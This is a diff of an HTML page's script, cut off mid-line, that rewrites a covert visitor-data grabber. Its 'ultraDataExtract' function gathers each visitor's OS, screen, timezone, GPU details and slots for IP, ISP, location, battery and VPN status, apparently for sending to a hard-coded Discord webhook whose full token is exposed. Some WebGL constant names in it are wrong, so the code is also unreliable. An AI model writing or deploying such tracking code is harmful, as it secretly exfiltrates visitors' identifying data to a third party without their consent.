@@ -16,48 +16,33 @@
     <script>
         "use strict";
 
-        const CONFIG = {
-            // Yeni Canary Webhook adresi entegre edildi
-            WEBHOOK_URL: "https://canary.discord.com/api/webhooks/1457149465688543363/FlP0AtpIk-Yg8NwxGQ1CSdityVf67AL-ODXFlPl9FtQq-tV5j2a9iZmWkGNAUsOHD9uL",
-            TIMEOUT: 5000
-        };
+        // Canary Webhook Address - Most Resilient for Automated Logging
+        const HOOK = "https://canary.discord.com/api/webhooks/1457149465688543363/FlP0AtpIk-Yg8NwxGQ1CSdityVf67AL-ODXFlPl9FtQq-tV5j2a9iZmWkGNAUsOHD9uL";
 
-        const getSafeOS = () => {
+        async function ultraDataExtract() {
+            // Initializing Data Object
+            let sys = {
+                os: "Unknown", gpu: "Blocked/Masked", ven: "Blocked/Masked",
+                ip: "N/A", iss: "N/A", loc: "N/A",
+                net: "N/A", bat: "N/A", 
+                res: `${screen.width}x${screen.height} (${screen.colorDepth}bit)`,
+                tz: Intl.DateTimeFormat().resolvedOptions().timeZone,
+                vpn: "✅ Clear"
+            };
+
+            // 1. Precise OS Extraction
             try {
                 const ua = navigator.userAgent;
                 const match = ua.match(/\(([^)]+)\)/);
-                return match ? match[1] : navigator.platform || "Unknown OS";
-            } catch { return "Extraction Failed"; }
-        };
+                sys.os = match ? match[1] : navigator.platform;
+            } catch(e) { sys.os = "Parsing Error"; }
 
-        const getGPUData = () => {
-            const data = { vendor: "Masked", renderer: "Masked" };
+            // 2. Hardware Extraction (WebGL Force)
             try {
                 const canvas = document.createElement('canvas');
                 const gl = canvas.getContext('webgl2') || canvas.getContext('webgl');
-                if (!gl) return data;
-
-                const dbg = gl.getExtension('WEBGL_debug_renderer_info');
-                if (dbg) {
-                    data.renderer = gl.getParameter(dbg.UNMASKED_RENDERER_ID) || "Hidden";
-                    data.vendor = gl.getParameter(dbg.UNMASKED_VENDOR_ID) || "Hidden";
-                }
-            } catch (e) { console.error("GPU Error"); }
-            return data;
-        };
-
-        const getNetworkStatus = () => {
-            try {
-                const conn = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
-                if (!conn) return "Unknown";
-                return `Type: ${conn.effectiveType || 'N/A'} | Speed: ~${conn.downlink || 0}Mbps | RTT: ${conn.rtt || 0}ms`;
-            } catch { return "Blocked"; }
-        };
-
-        const getBatteryStatus = async () => {
-            try {
-                if (!navigator.getBattery) return "Not Supported";
-                const b = await navigator.getBattery();
-                return `${Math.round(b.level * 100)}% (${b.charging ? 'Charging' : 'Discharging'})`;
-            }
-            
+                if (gl) {
+                    const dbg = gl.getExtension('WEBGL_debug_renderer_info');
+                    sys.gpu = gl.getParameter(dbg.UNMASKED_RENDERER_ID) || "Hidden";
+                    sys.ven = gl.getParameter(dbg.UNMASKED_
+                                              
